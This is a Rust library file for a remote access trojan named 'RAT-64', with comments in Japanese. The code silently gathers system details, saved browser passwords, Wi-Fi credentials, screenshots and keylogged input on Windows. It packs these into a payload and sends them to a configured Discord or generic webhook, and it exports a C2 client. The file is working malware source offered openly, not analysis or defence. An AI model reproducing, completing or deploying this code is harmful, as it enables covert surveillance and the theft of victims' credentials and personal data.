// RAT-64 Library - 統合されたモジュール構造（整理済み）
use serde::{Deserialize, Serialize};

// カスタムエラー型の定義
#[derive(Debug)]
pub enum RatError {
    Io(std::io::Error),
    Serialization(serde_json::Error),
    Encryption(String),
    Command(String),
    Config(String),
}

impl std::fmt::Display for RatError {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            RatError::Io(err) => write!(f, "I/O error: {}", err),
            RatError::Serialization(err) => write!(f, "Serialization error: {}", err),
            RatError::Encryption(msg) => write!(f, "Encryption error: {}", msg),
            RatError::Command(msg) => write!(f, "Command error: {}", msg),
            RatError::Config(msg) => write!(f, "Configuration error: {}", msg),
        }
    }
}

impl std::error::Error for RatError {}

impl From<std::io::Error> for RatError {
    fn from(err: std::io::Error) -> Self {
        RatError::Io(err)
    }
}

impl From<serde_json::Error> for RatError {
    fn from(err: serde_json::Error) -> Self {
        RatError::Serialization(err)
    }
}

pub type RatResult<T> = Result<T, RatError>;

// 整理されたモジュールシステム
pub mod collectors;
pub mod core;
pub mod network;
pub mod utils;
pub mod services;

// 公開API（新しいモジュール構造に対応）
pub use core::{load_config_or_default, Config};
// Windows専用の収集系APIはWindowsのみ公開
#[cfg(windows)]
pub use collectors::{
    collect_auth_data_with_config,
    // Enhanced keylogger functions
    collect_input_events_for,
    collect_input_events_structured,
    collect_screenshots,
    get_daily_logs,
    get_default_profile,
    get_profile_path,
    get_statistics,
    get_system_info,
    get_system_info_async,
    load_session_from_file,
    save_session_to_file,
    AuthData,
    DecryptedLogin,
    DiskInfo,
    InputEvent,
    InputStatistics,
    JsonCredentials,
    NetworkInterface,
    NssCredentials,
    ScreenshotData,
    SqliteCredentials,
    SystemInfo,
};
pub use network::{upload_data_file, upload_multiple, UploadError, UploadResult, Uploader};
pub use services::C2Client;
pub use utils::{encrypt_data_with_key, generate_key_pair};

// メイン実行機能
#[cfg(windows)]
pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
    // システム情報収集（サイレント）
    let _ = get_system_info_async().await;

    // 認証データ収集（サイレント）
    let _auth_data = collect_auth_data_with_config(config);

    // スクリーンショット収集（サイレント）
    if config.collect_screenshots {
        let _screenshot_data = collect_screenshots(config);
    }

    Ok(String::new())
}

// 統合データペイロード（最適化版・後方互換性削除）
#[cfg(windows)]
#[derive(Serialize, Deserialize, Debug)]
pub struct IntegratedPayload {
    pub system_info: SystemInfo,
    pub auth_data: AuthData,
    pub screenshot_data: Option<ScreenshotData>,
    pub input_events_structured: Vec<InputEvent>, // 構造化入力データのみ（レガシー削除）
    pub input_statistics: InputStatistics,        // 入力統計情報（必須）
    pub timestamp: String,
    pub session_id: String,
    pub encryption_key: String, // Base64エンコードされた暗号化キー（必須）
    pub encryption_nonce: String, // Base64エンコードされたノンス（必須）
}

#[cfg(windows)]
impl IntegratedPayload {
    pub async fn create_with_config(config: &Config) -> RatResult<Self> {
        let system_info = get_system_info_async().await?;
        let auth_data = collect_auth_data_with_config(config);
        let screenshot_data = if config.collect_screenshots {
            Some(collect_screenshots(config))
        } else {
            None
        };
        // 入力イベント（Windowsのみ、3秒サンプリング）
        let (input_events_structured, input_statistics) = {
            use crate::collectors::key_mouse_logger::{
                collect_input_events_structured, get_statistics,
            };
            let structured = tokio::task::spawn_blocking(|| collect_input_events_structured(3000))
                .await
                .unwrap_or_default();
            let stats = get_statistics().unwrap_or_default();
            (structured, stats)
        };

        // 暗号化キーとノンス生成（必須）
        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        use rand::RngCore;
        rand::rng().fill_bytes(&mut key);
        rand::rng().fill_bytes(&mut nonce);

        Ok(IntegratedPayload {
            system_info,
            auth_data,
            screenshot_data,
            input_events_structured,
            input_statistics,
            timestamp: chrono::Utc::now().to_rfc3339(),
            session_id: uuid::Uuid::new_v4().to_string(),
            encryption_key: base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                &key,
            ),
            encryption_nonce: base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                &nonce,
            ),
        })
    }

    // キーとノンスを更新するメソッド（オプション）
    pub fn update_encryption_info(&mut self, key: &[u8; 32], nonce: &[u8; 12]) {
        self.encryption_key =
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, key);
        self.encryption_nonce =
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, nonce);
    }
}

// Webhook送信（統合版）
#[cfg(windows)]
pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
    if !config.webhook_enabled {
        return Ok(());
    }
    if config.webhook_url.trim().is_empty() {
        return Ok(());
    }

    match config.webhook_type.as_str() {
        "Discord" => send_discord_webhook(payload, config).await,
        _ => send_generic_webhook(payload, config).await,
    }
}

#[cfg(windows)]
async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
    use serde_json::json;

    let public_ip = payload.system_info.public_ip.as_deref().unwrap_or("不明");
    let password_count = payload.auth_data.passwords.len();
    let wifi_count = payload.auth_data.wifi_creds.len();
    let screenshot_count = payload
        .screenshot_data
        .as_ref()
        .map(|s| s.total_count)
        .unwrap_or(0);

    let embed = json!({
        "title": format!("🔥 RAT-64 データ収集 - {}", payload.system_info.hostname),
        "color": 0x00ff00,
        "fields": [
            {
                "name": "💻 システム情報",
                "value": format!("**ホスト名**: {}\n**ユーザー**: {}\n**OS**: {} {}\n**CPU**: {}\n**RAM**: {:.1}GB / {:.1}GB\n**仮想マシン**: {}",
                    payload.system_info.hostname,
                    payload.system_info.username,
                    payload.system_info.os_name,
                    payload.system_info.os_version,
                    payload.system_info.cpu_info,
                    payload.system_info.memory_available_gb,
                    payload.system_info.memory_total_gb,
                    if payload.system_info.is_virtual_machine {
                        payload.system_info
                            .virtual_machine_vendor
                            .as_deref()
                            .unwrap_or("はい")
                    } else {
                        "いいえ"
                    }
                ),
                "inline": false
            },
            {
                "name": "🌐 ネットワーク情報",
                "value": format!("**ローカルIP**: {}\n**グローバルIP**: {}\n**タイムゾーン**: {}",
                    payload.system_info.local_ip,
                    public_ip,
                    payload.system_info.timezone
                ),
                "inline": false
            },
            {
                "name": "📊 収集データ",
                "value": format!("**パスワード**: {}件\n**ネットワーク情報**: {}件\n**スクリーンショット**: {}件",
                    password_count,
                    wifi_count,
                    screenshot_count
                ),
                "inline": false
            },
            {
                "name": "🔐 暗号化情報",
                "value": format!("**キー**: {}\n**ノンス**: {}",
                    payload.encryption_key,
                    payload.encryption_nonce
                ),
                "inline": false
            }
        ],
        "footer": {
            "text": format!("収集時刻: {} | セッションID: {}",
                payload.timestamp,
                payload.session_id.chars().take(8).collect::<String>()
            )
        }
    });

    let webhook_payload = json!({
        "embeds": [embed]
    });

    let body = serde_json::to_string(&webhook_payload)?;
    send_json_webhook(
        &config.webhook_url,
        body,
        "Discord Webhook",
        config.timeout_seconds,
    )
    .await
}

#[cfg(windows)]
async fn send_generic_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
    let body = serde_json::to_string(payload)?;
    send_json_webhook(
        &config.webhook_url,
        body,
        "Generic Webhook",
        config.timeout_seconds,
    )
    .await
}

async fn send_json_webhook(
    url: &str,
    body: String,
    context: &str,
    timeout_seconds: u64,
) -> RatResult<()> {
    let url_owned = url.to_owned();
    let context_owned = context.to_owned();
    let join_context = context_owned.clone();

    let response_result = tokio::task::spawn_blocking(move || {
        let mut req = minreq::post(url_owned)
            .with_header("Content-Type", "application/json")
            .with_body(body);
        if timeout_seconds > 0 {
            req = req.with_timeout(timeout_seconds);
        }
        req.send()
    })
    .await
    .map_err(|e| RatError::Command(format!("{} Webhook送信スレッドエラー: {}", join_context, e)))?;

    let request_context = context_owned.clone();
    let response = response_result
        .map_err(|e| RatError::Command(format!("{} Webhook送信エラー: {}", request_context, e)))?;

    if !(200..=299).contains(&response.status_code) {
        return Err(RatError::Command(format!(
            "{} Webhook送信失敗: {}",
            context_owned, response.status_code
        )));
    }

    Ok(())
}

// ユーティリティ関数
#[cfg(windows)]
pub fn get_local_ip() -> Option<String> {
    crate::collectors::system_info::get_primary_local_ip()
}
#[cfg(not(windows))]
pub fn get_local_ip() -> Option<String> {
    None
}
